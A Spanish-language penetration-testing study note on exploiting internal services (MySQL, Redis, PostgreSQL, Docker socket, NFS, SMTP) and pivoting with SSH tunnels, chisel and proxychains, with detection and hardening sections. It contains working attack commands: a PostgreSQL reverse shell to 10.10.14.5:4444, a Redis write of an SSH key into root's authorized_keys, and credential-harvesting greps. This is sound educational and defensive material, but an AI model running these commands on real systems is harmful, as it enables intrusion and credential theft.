---
tags:
  - ciberseguridad
  - escalada
  - explotacion-internos
tipo: concepto
estado: terminado
---

# Explotación de Servicios Internos

Los **servicios internos** son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros. Cuando estos servicios **no están configurados adecuados** y se encuentran activos, representan una brecha: base de datos local con credenciales reutilizadas, daemon escuchando solo en localhost, o un canal de reenvío (tunnel) que convierte una shell limitada en un pivot hacia toda la red.

> [!info] Tipos Comunes de Servicios Internos
> En sistemas operativos basados en Linux, los servicios suelen gestionarse a través de `systemd` (unidades de servicio), `init.d` o `xinetd`. En Windows, se conocen como "Servicios de Windows" y se gestionan a través del Administrador de Servicios (`services.msc`) o comandos como `sc`. Estos servicios pueden ejecutarse con diferentes niveles de privilegio, desde usuarios de bajo nivel hasta `root` o `SYSTEM`.

No obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas.

> [!warning] Riesgos de Configuración Inadecuada
> Las configuraciones inadecuadas pueden incluir:
> *   **Permisos débiles**: Archivos de configuración o ejecutables de servicio con permisos de escritura para usuarios de bajo privilegio.
> *   **Credenciales por defecto o débiles**: Servicios que utilizan contraseñas predeterminadas o fáciles de adivinar.
> *   **Vulnerabilidades sin parchear**: Software de servicio obsoleto con exploits conocidos.
> *   **Configuraciones de red expuestas**: Servicios que escuchan en interfaces públicas cuando deberían ser solo locales.
> *   **Rutas de búsqueda inseguras (PATH hijacking)**: Servicios que ejecutan binarios sin rutas absolutas, permitiendo la inyección de ejecutables maliciosos.

Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y encontrar una forma de aprovecharlo, podría utilizarlo para escalar privilegios y obtener acceso de administrador.

> [!tip] Detección Inicial de Servicios
> Para detectar servicios activos en un sistema, se pueden utilizar diversas herramientas y comandos:
> *   **Linux**: `systemctl list-units --type=service`, `ps aux | grep -i service`, `netstat -tulnp` (para servicios de red).
> *   **Windows**: `sc query state= all`, `Get-Service` (PowerShell), `netstat -ano` (para servicios de red).
> La identificación de puertos abiertos y los procesos asociados es un paso crucial en el reconocimiento de servicios explotables.

## Mecánica: el mapa de ataque de un servicio interno

Un servicio interno es valioso por **cuatro razones** distintas; cada una lleva a un tipo de explotación:

| Razón | Ejemplo | Explotación típica |
|---|---|---|
| **Corre con más privilegios que vos** | MySQL como `mysql`, daemon como `root` | si hay RCE/escritura de config → escalada |
| **Guarda credenciales reutilizables** | `mysql`, `redis`, `.pgpass`, `/etc/netplan` | misma password en otros servicios/usuarios → lateral |
| **Escucha en localhost sin auth** | `127.0.0.1:6379`, `111` (rpcbind), `docker.sock` | acceso directo desde tu shell sin red externa |
| **Es un canal de reenvío/pivot** | SSH, SOCKS de `ssh -D`, `chisel` | atravesar NAT/firewall hacia otras redes |

Pregunta de triage: **"¿quién corre este proceso, qué puertos abre, y qué credenciales/archivos maneja?"**

## Enumeración: servicios locales

```bash
# 1. Todos los servicios y su estado
systemctl list-units --type=service --state=running
ps aux --sort=-%mem | head -25              # procesos + usuario dueño

# 2. Puertos escuchando (con proceso — requiere root para ver nombres de todos)
ss -tulnp                                   # moderno
netstat -tulnp                              # clásico (net-tools)
# Columnas: t=tcp u=udp L=listen P=procs; 127.0.0.1:* = SOLO localhost

# 3. Reglas de firewall que definen qué es "interno"
iptables -L -n 2>/dev/null; nft list ruleset 2>/dev/null
cat /etc/hosts                              # nombres y hosts internos

# 4. Versiones para búsqueda de CVEs
curl -sI 127.0.0.1:PORT | head              # HTTP
mysql --version; redis-server --version; ssh -V

# 5. Credenciales en configuraciones del servicio
grep -rniE 'pass(word)?|secret|token' /etc/mysql /etc/redis /var/www 2>/dev/null | head
cat ~/.my.cnf ~/.pgpass ~/.rediscli_history 2>/dev/null
ls -la /var/run/mysqld /var/run/postgresql /var/run/docker.sock 2>/dev/null
```

El mapeo completo de red (qué hosts y puertos hay alrededor) se hace con [[Nmap Guía Completa]]; comandos base de soporte en [[Comandos Básicos de Sistema y Red en Linux]].

## Catálogo de servicios locales frecuentes

| Servicio | Puerto | Auth por defecto | Vector de explotación | Escalada obtenida |
|---|---|---|---|---|
| **MySQL/MariaDB** | 3306 | root sin pass (instalaciones viejas), `debian-sys-maint` en `/etc/mysql/debian.cnf` | `mysql -u root` sin pass; creds de `debian.cnf` reusadas en otros hosts | leer `mysql.user`, UDF `sys_exec` → shell, o creds reusadas |
| **PostgreSQL** | 5432 | peer/trust en local | `psql -U postgres` vía socket; creds en `~/.pgpass` | `COPY … TO PROGRAM` → RCE como `postgres` |
| **Redis** | 6379 | **sin auth** frecuente | `redis-cli -h 127.0.0.1 ping` → `CONFIG GET dir` → `SET` de clave SSH o cron | root si el daemon corre como root (cron/SSH key write) |
| **MongoDB** | 27017 | sin auth por defecto (≤3) | `mongo --eval 'db.adminCommand({listDatabases:1})'` | datos + a veces RCE por `$where`/JS |
| **Docker API** | 2375/sock | socket local | `curl --unix-socket /var/run/docker.sock` | **root total** (ver nota Docker) |
| **RPC/NFS** | 111/2049 | mount por IP | `showmount -e`; `no_root_squash` → escribir como root | root vía archivo SUID en share |
| **SMTP** | 25/587 | VRFY/EXPN abiertos | enumeración de usuarios (abajo) | listados para fuerza bruta (`THC Hydra`) |
| **CUPS** | 631 | admin sin pass a veces | lectura/impresión, config | info leak |
| **Jenkins/Gitea/Portainer** | 8080/3000/9000 | `admin:admin` | panel → job/container arbitrario | root o shell |
| **MySQL X/Adminer** | web | creds reusadas | Adminer con creds de `config.php` | datos/RCE |

### Explotación: MySQL con credenciales locales

```bash
# Credenciales que suelen estar en claro:
cat /etc/mysql/debian.cnf            # [client] user=debian-sys-maint pass=...
cat /var/www/html/config.php | grep -i pass   # web app → mismas creds

mysql -u debian-sys-maint -p'<pass>' -e "SELECT user,host,authentication_string FROM mysql.user;"
# UDF para shell (si hay FILE priv + writable plugin dir):
# SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so'
```

### Explotación: Redis sin autenticación

```bash
redis-cli -h 127.0.0.1 ping                    # PONG ⇒ abierto
redis-cli info server | grep version
# 1) SSH key (si el daemon escucha en otra interface o tenemos pivot):
redis-cli -h 127.0.0.1 config set dir /root/.ssh
redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
redis-cli -h 127.0.0.1 set x "$(cat id_rsa.pub)"
redis-cli -h 127.0.0.1 save
# 2) Cron: dir /var/spool/cron/crontabs + dbfilename root (menos fiable por formato)
# 3) Módulo: MODULE LOAD /ruta/evil.so → comandos arbitrarios
```

### Explotación: PostgreSQL local

```bash
psql -U postgres -h /var/run/postgresql -c 'select version();'
# RCE si se es rol superuser:
psql -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"';"
```

### Explotación: enumeración SMTP

```bash
# VRFY/EXPN/RCPT TO — extraer usuarios válidos sin enviar correo
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.5      # tool clásica
# manual:
nc 10.10.10.5 25
VRFY root
EXPN admin
# con servidor objetivo (si hay open-relay): RCPT TO:<user@dom>
```

Los usuarios obtenidos alimentan la fuerza bruta (`THC Hydra`, [[THC Hydra]]) o el mapeo de cuentas en Active Directory/SSH.

## Reenvío de puertos y pivoting

La segunda mitad de la nota: usar el acceso como **túnel**. Escenario estándar: tienes una shell en un host que ve dos redes; tus herramientas (nmap, browser) corren en **tu máquina**.

### SSH: `-L`, `-R`, `-D` (la navaja suiza, sin instalar nada)

| Flag | Dirección | Uso | Ejemplo |
|---|---|---|---|
| `-L local:port:dst:dstport` | desde **mi** equipo | traer un puerto remoto a `localhost` | `ssh -L 3306:127.0.0.1:3306 user@pivot` → `mysql -h 127.0.0.1` llega al MySQL del pivot |
| `-R remote:port:dst:dstport` | desde el **remoto** | exponer mi servicio allá | `ssh -R 8080:127.0.0.1:80 user@attacker` → el remoto ve mi web en `:8080` |
| `-D localport` | SOCKS5 local | proxyar **cualquier** tool | `ssh -D 1080 user@pivot` → `proxychains nmap -sT ...` |

```bash
# Túnel inverso (reverse) cuando el remoto no acepta conexiones entrantes:
ssh -N -R 0.0.0.0:9999:127.0.0.1:22 user@tu-atacante    # pivot expone su SSH a ti
# GatewayPorts para escuchar en interface externa del remoto (si sshd lo permite)

# Persistentes: -f -N y keepalive en ~/.ssh/config
ssh -f -N -L 3306:127.0.0.1:3306 user@pivot
```

### Chisel (cuando no hay SSH o hay que cruzar HTTP)

```bash
# Atacante:
./chisel server --reverse --port 8080
# Pivot (cliente, sube el reverse tunnel):
./chisel client 10.10.14.5:8080 R:socks
# → queda un SOCKS5 en 127.0.0.1:1080 del atacante
proxychains nmap -sT -Pn 10.0.0.0/24      # TCP-only vía proxy (ver errores comunes)
```

### Proxychains

```bash
cat /etc/proxychains4.conf
# tails: socks4 127.0.0.1 1080  /  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p- 10.0.0.5      # -sT obligatorio: el proxy es TCP
proxychains curl http://10.0.0.5/internal
proxychains ssh user@10.0.0.5
```

### Básicos de pivoting (orden mental)

1. **Mapa**: `ip a`, `ip r`, `cat /etc/hosts`, `ss -tulnp` → qué redes ve el pivot.
2. **Decisión**: `ssh -L` si hay SSH usable; `chisel`/`socat` si solo hay HTTP; `ssh -D`/SOCKS si hay muchas hosts.
3. **Discovery tras el túnel**: `proxychains nmap -sT -Pn` o scripts que corran **en el pivot** (`nmap` local allá).
4. **Repite**: cada host ganado es un nuevo punto de reenvío (cadena de pivotes).
5. **Explota** el servicio interno de cada host con el catálogo de arriba.

## Detección (lado defensor)

- **Túneles**: conexiones SSH largas con `-L/-R` aparecen en `/var/log/auth.log` (`Accepted publickey …`; los forwards no se loguean por defecto — habilitar `loglevel VERBOSE` y `permitopen` en `sshd_config`).
- **Chisel/socat**: procesos sin TTY que hacen conexiones salientes repetidas a un mismo IP:PUERTO (`ss -tnp`, EDR sobre `execve` de binarios desconocidos).
- **Redis/MySQL desde localhost**: logs de acceso (`redis.log` `Accepted`, MySQL `general_log`) con `127.0.0.1` anómalo o desde usuario web.
- **`CONFIG SET dir` en Redis** y escrituras a `authorized_keys` → alerta clásica (auditd en `~/.ssh`).
- **SMTP VRFY masivo** → tasa de `250` anómala en logs de postfix/exim.
- **Procesos creando listeners nuevos**: `journalctl -f` + `ss -tulnp` en baseline.

## Impacto

- **Escalada local**: servicio corriendo como root con config/creds manipulables (Redis → cron/SSH; NFS `no_root_squash`; Adminer con `FILE`).
- **Lateral movement**: credenciales reutilizadas entre servicios (web → DB → SSH → otro host).
- **Pivot a otras redes**: acceso a subredes inalcanzables directamente (DMZ, red de gestión, VLAN de servidores).
- En conjunto: de una shell low-priv a **root + mapa completo de la red interna**.

## Sección defensiva: endurecimiento

```bash
# 1. Escuchar solo lo necesario y dónde corresponde
# Redis:   bind 127.0.0.1 ::1   +  requirepass <fuerte>  (+ rename-command CONFIG "")
# MySQL:   skip-networking=0, bind-address=127.0.0.1, users con host concreto
# Docker:  -H fd:// sin tcp://2375
ss -tulnp | grep -E '127.0.0.1|\*'      # auditar qué está en 0.0.0.0

# 2. Credenciales únicas por servicio (no reutilizar)
grep -R 'DB_PASSWORD\|pass' /var/www 2>/dev/null   # rotar si aparece en claro
# 3. Auth siempre: requirepass, --requirepass, psql con scram-sha-256
redis-cli CONFIG SET requirepass '<pass>'   # o requirepass en redis.conf

# 4. Usuarios de servicio sin shell ni home
usermod -s /usr/sbin/nologin mysql redis

# 5. SSH duro (controla -L/-R):
# /etc/ssh/sshd_config
PermitOpen <host>:<puerto>      # restringe -L
GatewayPorts no                 # bloquea -R en interfaces externas
AllowTcpForwarding no           # si no hace falta
X11Forwarding no

# 6. Firewall: negar por defecto, solo servicios esperados
nft add rule inet filter input tcp dport { 22, 80 } accept
nft add rule inet filter input ct state established accept
nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }

# 7. NFS: no_root_squash → root_squash (default) y export por IP concreto
cat /etc/exports
```

## Errores comunes

1. **`nmap` UDP/TCP connect fallando vía proxychains**: `-sT -Pn` es obligatorio (el SOCKS no sabe hacer SYN raw ni ARP); `-sS/-sU` no funcionan.
2. **Olvidar que `-L` binda en `127.0.0.1` del atacante**: si tu tool va a `localhost:3306` y "conexión rechazada", el túnel no está vivo (`-N`, revisar salida del ssh).
3. **Confundir `-L` y `-R`**: regla — *el flag dice desde dónde queda publicado el puerto*; `-L` es local (traes el remoto), `-R` es remoto (expones lo tuyo allá).
4. **Buscar servicios solo en `0.0.0.0`**: los más jugosos están en `127.0.0.1` y no aparecen en escaneos externos — mirar siempre `ss -tulnp` local.
5. **Asumir que "solo localhost" = seguro**: cualquier RCE en la web local (SSI, SSRF, otro usuario) llega a esos puertos; y tu propia shell low-priv también.
6. **False positive de credenciales**: `grep pass` encuentra cadenas de ejemplo/docs — validar con login real antes de reportar.
7. **No comprobar el usuario dueño del proceso**: un MySQL como `mysql` no da root directo; el impacto depende del EUID del daemon (ver columna "quién corre").

## Cheatsheet

```bash
# Enumeración
systemctl list-units --type=service; ps aux | head
ss -tulnp; netstat -tulnp
grep -rniE 'pass(word)?|secret' /etc/mysql /etc/redis /var/www 2>/dev/null
iptables -L -n; cat /etc/hosts; cat /etc/exports

# Servicios
mysql -u root                             # sin pass?
cat /etc/mysql/debian.cnf
redis-cli -h 127.0.0.1 ping; redis-cli info server
psql -U postgres -h /var/run/postgresql
nc 127.0.0.1 25   →  VRFY root / EXPN admin

# Reenvío
ssh -N -L 3306:127.0.0.1:3306 user@pivot        # local→dst remoto
ssh -N -R 8080:127.0.0.1:80 user@attacker       # remoto→mi servicio
ssh -N -D 1080 user@pivot                       # SOCKS5
./chisel server --reverse --port 8080           #  ./chisel client IP:8080 R:socks
proxychains nmap -sT -Pn -p- 10.0.0.5

# Endurecimiento
redis: bind 127.0.0.1 + requirepass; docker: sin :2375
sshd: AllowTcpForwarding no / PermitOpen; nft policy drop
```

## Referencias

- HackTricks — Network services pentesting: https://book.hacktricks.wiki/en/network-services-pentesting.html
- HackTricks — SSH tunneling / proxying: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html
- Chisel: https://github.com/jpillora/chisel
- Proxychains: https://github.com/haad/proxychains
- GTFOBins (binarios de servicios): https://gtfobins.github.io/
- Notas internas: [[Nmap Guía Completa]], [[Comandos Básicos de Sistema y Red en Linux]], [[Abuso de Permisos en Linux y LSE]], [[THC Hydra]], [[CrackMapExec Guía de Uso]]

## Relacionadas

- [[Nmap Guía Completa]] — descubrimiento de hosts/puertos tras cada túnel
- [[Comandos Básicos de Sistema y Red en Linux]] — `ss`, `netstat`, `iptables` de apoyo
- [[Abuso de Permisos en Linux y LSE]] — dónde encaja este vector en la enumeración
- [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]] — `docker.sock` como servicio interno definitivo
- [[Grupos de Linux y Escalada de Privilegios]] — usuarios de servicio y sus grupos
- [[THC Hydra]] — uso de usuarios enumerados por SMTP en fuerza bruta
